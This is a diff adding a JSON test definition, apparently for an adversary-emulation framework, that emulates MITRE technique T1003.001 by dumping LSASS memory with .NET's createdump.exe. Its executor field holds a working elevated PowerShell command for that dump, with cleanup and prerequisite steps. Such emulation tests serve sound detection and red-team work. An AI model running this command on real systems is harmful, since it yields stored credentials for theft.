@@ -1,0 +1,32 @@
+{
+    "name": "Dump LSASS with createdump.exe from .Net v5",
+    "description": "Use createdump executable from .NET to create an LSASS dump.  [Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20) ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\n& \"$exePath\" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id\n",
+        "cleanup_command": "Remove-Item $env:Temp\\dotnet-lsass.dmp -ErrorAction Ignore\n",
+        "name": "powershell",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1003.001",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "LSASS Memory",
+    "source": "ART",
+    "uuid": "9d0072c8-7cca-45c4-bd14-f852cfa35cf0",
+    "arguments": null,
+    "preconditions": [
+        {
+            "description": ".Net v5 must be installed\n",
+            "prereq_command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\nif ($exePath -and (Test-Path $exePath)) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "winget install Microsoft.DotNet.DesktopRuntime.5 --accept-source-agreements --accept-package-agreements --silent\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
